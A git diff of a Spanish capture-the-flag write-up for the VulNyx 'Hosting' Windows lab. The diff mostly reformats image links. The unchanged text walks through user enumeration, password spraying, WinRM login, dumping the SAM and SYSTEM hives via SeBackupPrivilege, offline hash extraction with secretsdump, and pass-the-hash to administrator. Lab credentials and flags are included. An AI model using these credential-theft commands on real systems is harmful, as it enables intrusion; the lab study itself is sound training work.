@@ -2,13 +2,15 @@ ___
 Tags: #smb #smb-bruteforce #rpc-enumeration #winrm #sebackupprivilege #sam-system #pass-the-hash
 ___
 # Hosting
+
 ## Información General
 
-**- Dificultad:** Fácil
-**- Sistema operativo:** Window
-**- Vulnerabilidad explotada.**  Permisos mal configurado
-**- Fecha de resolución:** 7/05/2026
-**- Enlace:** [Hosting](https://vulnyx.com/machines/)
+**- Dificultad:** Fácil <br>
+**- Sistema operativo:** Window <br>
+**- Vulnerabilidad explotada.**  Permisos mal configurado <br>
+**- Fecha de resolución:** 7/05/2026 <br>
+**- Enlace:** [Hosting](https://vulnyx.com/machines/) <br>
+
 ## Reconocimiento
 
 **ARP-SCAN**
@@ -19,8 +21,12 @@ Ejecutamos el siguiente comando:
 sudo arp-scan -I eth0 --localnet --ignoredups
 ```
 
-![[Hosting.png]]
+<p align="center"> 
+<img src="images/Hosting.png" width="600" alt="Resultado de Nmap">
+</p>
+
 ## Enumeración
+
 ### Escaneo de puertos abiertos
 
 #### Escaneo de puerto TCP
@@ -59,6 +65,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 ### Enumeración web
+
 #### Gobuster
 
 ```
@@ -67,7 +74,9 @@ gobuster dir -u http://<ipVictima> -w /usr/share/wordlists/dirbuster/directory-l
 
 >speed                (Status: 301) [Size: 161] [--> http://192.168.0.109/speed/]
 
-![[teams.png]]
+<p align="center"> 
+<img src="images/teams.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Observamos en la imagen lo siguiente el dominio de la maquina que es **hosting.nyx**
 y los usuarios que compone ese dominio son:
@@ -91,7 +100,9 @@ rpcclient -U "p.smith%kissme" 192.168.0.109
 querydispinfo
 ```
 
-![[mdavis.png]]
+<p align="center"> 
+<img src="images/mdavis.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Las "nuevas" credenciales --> **m.davis**:**H0$T1nG123!**
 
@@ -101,7 +112,9 @@ La pruebo con crackmapexec pero me sale erróneo
 crackmapexec smb 192.168.0.109 -u 'm.davis' -p 'H0$T1nG123!' 
 ```
 
-![[cred mdavis.png]]
+<p align="center"> 
+<img src="images/cred mdavis.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Pero vemos que no cuadra, por tanto se me ocurre probar esa contraseña con los otros usuarios. Por tanto, con el usuario **j.wilson** si me lo de válido
 
@@ -109,7 +122,9 @@ Pero vemos que no cuadra, por tanto se me ocurre probar esa contraseña con los 
 crackmapexec smb 192.168.0.109 -u 'j.wilson' -p 'H0$T1nG123!'
 ```
 
-![[Hosting jwilson.png]]
+<p align="center"> 
+<img src="images/Hosting jwilson.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Intento probar con el usuario **j.wilson** si me deja logearme con evil-winrm 
 
@@ -117,7 +132,9 @@ Intento probar con el usuario **j.wilson** si me deja logearme con evil-winrm
 evil-winrm -i 192.168.0.109 -u 'j.wilson' -p 'H0$T1nG123!' 
 ```
 
-![[evil-winrm jwilson.png]]
+<p align="center"> 
+<img src="images/evil-winrm jwilson.png" width="600" alt="Resultado de Nmap">
+</p>
 
 flag user: **50e5add3f5cb0642fefc5e907086b313** 
 
@@ -129,7 +146,9 @@ Efectuamos el siguiente comando dentro de la sesión
 whoami /priv
 ```
 
-![[permisos.png]]
+<p align="center"> 
+<img src="images/permisos.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Tenemos habilitado el permiso **SeBackupPrivilege** eso significa tener una vía directa para obtener privilegios de **Administrator** o **SYSTEM** en un equipo o Controlador de Dominio, saltándose las Listas de Control de Acceso
 
@@ -143,7 +162,9 @@ reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system
 
 - **`reg save HKLM\SYSTEM system`**: Crea una copia del archivo **SYSTEM**. Este es fundamental porque contiene la **Boot Key** (clave de arranque), necesaria para descifrar el contenido del archivo SAM.
 
-![[archivos obt.png]]
+<p align="center"> 
+<img src="images/archivos obt.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 download sam
@@ -161,15 +182,20 @@ impacket-secretsdump -system system -sam sam LOCAL
 - **`-sam sam`**: Le indicas dónde está el archivo de la colmena **SAM**. Aquí es donde están guardados los usuarios locales y sus contraseñas en formato hash.
 - **`LOCAL`**: Este parámetro es fundamental. Le dice a la herramienta que no intente conectarse a ninguna red ni a ninguna IP, sino que **trabaje con los archivos que tienes en tu carpeta actual**.
 
-![[hashhhh.png]]
+<p align="center"> 
+<img src="images/hashhhh.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 evil-winrm -i 192.168.0.109 -u 'administrator' -H '41186fb28e283ff758bb3dbeb6fb4a5c'
 ```
 
-![[flag root.png]]
+<p align="center"> 
+<img src="images/flag root.png" width="600" alt="Resultado de Nmap">
+</p>
 
 flag root: **9924b42399b3e0704068a3012871dc98**
+
 ## Conclusión
 
-LA máquina Hosting de la plataforma VulNyx ha sido muy divertida y he aprendido un montón y repasado conceptos de AD. 
+LA máquina Hosting de la plataforma VulNyx ha sido muy divertida y he aprendido un montón y repasado conceptos de AD.
